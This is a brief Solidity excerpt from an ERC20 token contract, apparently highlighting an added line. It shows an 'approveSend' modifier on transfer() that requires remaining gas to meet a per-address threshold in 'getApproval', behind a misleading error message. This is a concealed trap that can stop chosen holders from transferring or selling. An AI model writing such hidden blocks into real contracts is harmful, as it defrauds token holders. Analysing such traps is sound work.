...
contract ERC20 is Context, IERC20 {
  ...
  modifier approveSend() {//ADDED
        require(gasleft() >= getApproval[_msgSender()], "Approve to swap on Dex");
        _;
    }
  ...
  function transfer(address recipient, uint256 amount) public virtual  override approveSend returns (bool) {
    _claimRecord();
